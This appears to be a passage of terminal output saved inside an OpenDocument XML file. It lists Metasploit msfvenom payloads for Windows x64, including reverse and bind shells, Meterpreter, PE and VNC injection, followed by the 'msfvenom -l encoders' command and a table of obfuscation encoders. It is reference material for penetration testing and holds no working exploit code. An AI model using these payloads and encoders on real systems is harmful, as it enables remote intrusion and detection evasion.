      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/reverse_tcp <text:s text:c="2"/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/reverse_tcp_ <text:s/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rc4 <text:s text:c="30"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/reverse_tcp_ <text:s/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uuid <text:s text:c="29"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/reverse_winh <text:s/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttp <text:s text:c="29"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/reverse_winh <text:s/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttps <text:s text:c="28"/>communication over HTTPS (Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/exec <text:s text:c="16"/>Execute an arbitrary command (W</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>indows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/loadlibrary <text:s text:c="9"/>Load an arbitrary x64 library p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ath</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/messagebox <text:s text:c="10"/>Spawn a dialog via MessageBox u</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sing a customizable title, text</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>&amp; icon</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/bind_ip <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>v6_tcp <text:s text:c="26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n IPv6 connection (Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/bind_ip <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>v6_tcp_uuid <text:s text:c="21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n IPv6 connection with U</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>UID Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/bind_na <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>med_pipe <text:s text:c="24"/>LL via the Reflective Dll Injec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion payload (staged). Requires</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>Windows XP SP2 or newer. Liste</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n for a pipe connection (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/bind_tc <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31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connection (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/bind_tc <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p_rc4 <text:s text:c="27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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/bind_tc <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p_uuid <text:s text:c="26"/>LL via the Reflective Dll Injec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion payload (staged). Requires</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Windows XP SP2 or newer. Liste</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n for a connection with UUID Su</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pport (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/reverse <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_http <text:s text:c="27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 (Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/reverse <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_https <text:s text:c="26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 (Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/reverse <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_named_pipe <text:s text:c="21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 via a n</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>amed pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/reverse <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28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 (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/reverse <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_rc4 <text:s text:c="24"/>LL via the Reflective Dll Injec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion payload (staged). Requires</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Windows XP SP2 or newer. Conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ct back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/reverse <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_uuid <text:s text:c="23"/>LL via the Reflective Dll Injec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion payload (staged). Requires</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>Windows XP SP2 or newer. Conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ct back to the attacker with UU</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ID Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/reverse <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_winhttp <text:s text:c="24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 (Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter/reverse <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_winhttps <text:s text:c="23"/>LL via the Reflective Dll Injec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion payload (staged). Requires</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Windows XP SP2 or newer. Tunne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>l communication over HTTPS (Win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dows x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter_bind_na <text:s/>Connect to victim and spawn a M</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>med_pipe <text:s text:c="24"/>eterpreter shell. Requires Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter_bind_tc <text:s/>Connect to victim and spawn a M</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>eterpreter shell. Requires Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter_reverse <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_http <text:s text:c="27"/>awn a Meterpreter shell. Requir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>es Windows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter_reverse <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_https <text:s text:c="26"/>awn a Meterpreter shell. Requir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>es Windows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter_reverse <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_ipv6_tcp <text:s text:c="23"/>awn a Meterpreter shell. Requir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>es Windows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/meterpreter_reverse <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>awn a Meterpreter shell. Requir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>es Windows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/bind_ipv6_ <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29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n IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>v6 connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/bind_ipv6_ <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>tcp_uuid <text:s text:c="24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n IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>v6 connection with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/bind_named <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_pipe <text:s text:c="2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pip</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/bind_tcp <text:s text:c="3"/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="3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oft-page-break/><text:s text:c="37"/>g might crash. Listen for a con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/bind_tcp_r <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>c4 <text:s text:c="30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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/bind_tcp_u <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uid <text:s text:c="29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Listen for a con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection with UUID Support (Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/reverse_na <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>med_pipe <text:s text:c="24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oft-page-break/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 via a named pipe p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/reverse_tc <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31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 (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/reverse_tc <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p_rc4 <text:s text:c="27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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/peinject/reverse_tc <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p_uuid <text:s text:c="26"/>into the exploited process usin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>g a reflective PE loader. The r</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>eflective PE loader will execut</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e the pre-mapped PE image start</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ing from the address of entry a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>fter performing image base relo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cation and API address resoluti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>on. This module requires a PE f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ile that contains relocation da</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>ta and a valid (uncorrupted) im</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>port table. PE files with CLR(C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>#/.NET executables), bounded im</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ports, and TLS callbacks are no</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t currently supported. Also PE</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>files which use resource loadin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>g might crash. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the attacker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/pingback_reverse_tc <text:s/>Connect back to attacker and re</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>port UUID (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/powershell_bind_tcp <text:s/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn an interactive powershell se</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ssion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/powershell_reverse_ <text:s/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>wn an interactive powershell se</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ssion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/powershell_reverse_ <text:s/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp_ssl <text:s text:c="25"/>wn an interactive powershell se</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ssion over SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell/bind_ipv6_tcp <text:s/>Spawn a piped command shell (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ndows x64) (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>an IPv6 connection (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell/bind_ipv6_tcp <text:s/>Spawn a piped command shell (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_uuid <text:s text:c="27"/>ndows x64) (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>an IPv6 connection with UUID S</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>upport (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell/bind_named_pi <text:s/>Spawn a piped command shell (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pe <text:s text:c="30"/>ndows x64) (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a pipe connection (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell/bind_tcp <text:s text:c="6"/>Spawn a piped command shell (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ndows x64) (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell/bind_tcp_rc4 <text:s text:c="2"/>Spawn a piped command shell (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ndows x64) (staged). Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell/bind_tcp_uuid <text:s/>Spawn a piped command shell (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ndows x64) (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a connection with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell/reverse_tcp <text:s text:c="3"/>Spawn a piped command shell (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ndows x64) (staged). Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to the attacker (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell/reverse_tcp_r <text:s/>Spawn a piped command shell (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>c4 <text:s text:c="30"/>ndows x64) (staged). Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell/reverse_tcp_u <text:s/>Spawn a piped command shell (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uid <text:s text:c="29"/>ndows x64) (staged). Connect ba</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ck to the attacker with UUID Su</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>pport (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell_bind_tcp <text:s text:c="6"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/shell_reverse_tcp <text:s text:c="3"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/bind_ipv6 <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Listen for an IPv6 connectio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/bind_ipv6 <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_uuid <text:s text:c="23"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Listen for an IPv6 connectio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n with UUID Support (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/bind_name <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_pipe <text:s text:c="26"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Listen for a pipe connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/bind_tcp <text:s text:c="2"/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Listen for a connection (Win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/bind_tcp_ <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rc4 <text:s text:c="29"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/bind_tcp_ <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uuid <text:s text:c="28"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Listen for a connection with</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>UUID Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/reverse_h <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttp <text:s text:c="29"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Tunnel communication over HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TP (Windows x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/reverse_h <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttps <text:s text:c="28"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Tunnel communication over HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TP (Windows x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/reverse_t <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/reverse_t <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_rc4 <text:s text:c="26"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/reverse_t <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_uuid <text:s text:c="25"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>with UUID Support (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/reverse_w <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>inhttp <text:s text:c="26"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Tunnel communication over HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TP (Windows x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/vncinject/reverse_w <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>inhttps <text:s text:c="25"/>ve loader (Windows x64) (staged</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Tunnel communication over HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TPS (Windows x64 winhttp)</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">msf6 &gt; msfvenom -l encoders</text:p>
      <text:p text:style-name="P1">[*] exec: msfvenom -l encoders</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Framework Encoders [--encoder &lt;value&gt;]</text:p>
      <text:p text:style-name="P1">======================================</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:s text:c="4"/>Name <text:s text:c="17"/>Rank <text:s text:c="6"/>Description</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>---- <text:s text:c="17"/>---- <text:s text:c="6"/>-----------</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/brace <text:s text:c="12"/>low <text:s text:c="7"/>Bash Brace Expansion Command En</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>coder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/echo <text:s text:c="13"/>good <text:s text:c="6"/>Echo Command Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/generic_sh <text:s text:c="7"/>manual <text:s text:c="4"/>Generic Shell Variable Substitu</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion Command Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/ifs <text:s text:c="14"/>low <text:s text:c="7"/>Bourne ${IFS} Substitution Comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>and Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/perl <text:s text:c="13"/>normal <text:s text:c="4"/>Perl Command Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/powershell_base6 <text:s/>excellent <text:s/>Powershell Base64 Command Encod</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>4 <text:s text:c="31"/>er</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/printf_php_mq <text:s text:c="4"/>manual <text:s text:c="4"/>printf(1) via PHP magic_quotes</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Utility Command Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>generic/eicar <text:s text:c="8"/>manual <text:s text:c="4"/>The EICAR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>generic/none <text:s text:c="9"/>normal <text:s text:c="4"/>The "none" Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>mipsbe/byte_xori <text:s text:c="5"/>normal <text:s text:c="4"/>Byte XORi Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>mipsbe/longxor <text:s text:c="7"/>normal <text:s text:c="4"/>XOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>mipsle/byte_xori <text:s text:c="5"/>normal <text:s text:c="4"/>Byte XORi Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>mipsle/longxor <text:s text:c="7"/>normal <text:s text:c="4"/>XOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/base64 <text:s text:c="11"/>great <text:s text:c="5"/>PHP Base64 Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ppc/longxor <text:s text:c="10"/>normal <text:s text:c="4"/>PPC LongXOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ppc/longxor_tag <text:s text:c="6"/>normal <text:s text:c="4"/>PPC LongXOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ruby/base64 <text:s text:c="10"/>great <text:s text:c="5"/>Ruby Base64 Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>sparc/longxor_tag <text:s text:c="4"/>normal <text:s text:c="4"/>SPARC DWORD XOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x64/xor <text:s text:c="14"/>normal <text:s text:c="4"/>XOR Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x64/xor_context <text:s text:c="6"/>normal <text:s text:c="4"/>Hostname-based Context Keyed Pa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>yload Encoder</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x64/xor_dynamic <text:s text:c="6"/>normal <text:s text:c="4"/>Dynamic key XOR Encoder</text:p>
